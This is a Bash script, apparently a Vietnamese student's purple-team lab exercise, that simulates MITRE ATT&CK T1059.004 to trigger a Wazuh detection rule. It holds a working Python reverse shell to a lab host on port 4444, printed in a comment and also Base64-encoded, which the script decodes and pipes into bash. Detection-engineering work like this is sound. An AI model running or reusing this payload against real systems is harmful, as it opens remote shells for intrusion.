#!/bin/bash
# =============================================================================
# Kịch bản kiểm thử T1059.004 - Execution: Unix Shell (Base64 Fileless Reverse Shell)
# Đồ án: Purple Team Detection Engineering Lab
# Sinh viên: Nguyễn Minh Trí (MSSV: 92510340016)
# Kỹ thuật: MITRE ATT&CK T1059.004
# Quy tắc Wazuh đích: Rule 100010 (Level 12)
# =============================================================================

echo "[*] =========================================================="
echo "[*] THỰC THI MÔ PHỎNG T1059.004 - REVERSE SHELL QUA BASE64"
echo "[*] Máy đích C2 Listener: 192.168.70.100 Cổng 4444"
echo "[*] =========================================================="

# Payload Python mã hóa Base64 kết nối về Wazuh Manager (192.168.70.100:4444)
# Nội dung giải mã:
# python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.70.100",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PAYLOAD="cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNzAuMTAwIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0pOyc="

echo "[+] Đang giải mã Base64 và đẩy trực tiếp vào pipeline bash (Fileless Execution)..."
# Chạy với timeout 3s để không treo script nếu máy C2 chưa bật nc listener
timeout 3s bash -c "echo '$PAYLOAD' | base64 -d | bash" || true

echo ""
echo "[✓] Đã thực thi lệnh Reverse Shell! Vui lòng kiểm tra cảnh báo Rule 100010 trên Wazuh Dashboard."
